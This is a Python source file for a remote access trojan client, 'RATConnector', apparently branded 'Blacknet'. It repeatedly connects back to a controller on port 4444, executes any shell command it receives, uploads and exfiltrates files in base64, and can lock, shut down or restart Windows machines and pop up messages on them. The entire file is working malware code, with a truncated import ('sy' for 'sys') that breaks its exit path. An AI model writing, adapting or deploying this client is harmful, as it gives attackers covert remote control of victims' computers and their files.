import socket, subprocess, time, json, os, base64, ctypes, os, sy

class RATConnector:
    def __init__(self, ip, port):
        # Try to connect to the server, if failed wait five seconds and try again.
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
            except socket.error:
                time.sleep(5)
            else:
                break

    # Function for sending data as JSON
    def dataSend(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

    # Function for receiving data as JSON
    def dataReceive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            # If ValueError returned then more data needs to be sent
            except ValueError:
                continue

    def arrayToString(self, s):
        convStr = ""
        for i in s:
            convStr += i
        return convStr

    # Run any command on the system
    def runCommand(self, command):
        return subprocess.check_output(
            command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        )

    # Reading files with base 64 encryption for non UTF-8 compatability
    def readFile(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    # Writing files, decode the b64 from the above function
    def writeFile(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload complete"

    def run(self):
        while True:
            command = self.dataReceive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "ratHelp":
                    commandResponse = ""
                elif command[0] == "cd" and len(command) > 1:
                    os.chdir(command[1])
                    commandResponse = "[+] Changing active directory to " + command[1]
                elif command[0] == "upload":
                    commandResponse = self.writeFile(command[1], command[2])
                elif command[0] == "download":
                    commandResponse = self.readFile(command[1]).decode()
                elif command[0] == "message":
                    # Shows a message box with the requested message using ctypes
                    ctypes.windll.user32.MessageBoxW(
                        0, command[1], "You Are Currently In Blacknet.", 1
                    )
                    commandResponse = "[+] Message received by client"
                elif command[0] == "lock":
                    ctypes.windll.user32.LockWorkStation()
                    commandResponse = "[+] Clients PC locked"
                elif command[0] == "shutdown":
                    os.system("shutdown /s /t 1")
                elif command[0] == "restart":
                    os.system("shutdown /r /t 1")
                elif command[0] == "gethostname":
                    os.system("whoami")
                elif command[0] == "Ip":
                    os.system("ipconfig")
                elif command[0] == "sysinfo":
                    os.system("systeminfo")
                elif command[0] == "netstat":
                    os.system("netstat")
                else:
                    convCommand = self.arrayToString(command)
                    commandResponse = self.runCommand(convCommand).decode()
            # Whole error handling, bad practice but required to keep connection
            except Exception as e:
                commandResponse = (
                    f"[-] Error running command: {e}"
                )
            self.dataSend(commandResponse)


ratClient = RATConnector("127.0.0.1", 4444)
ratClient.run()
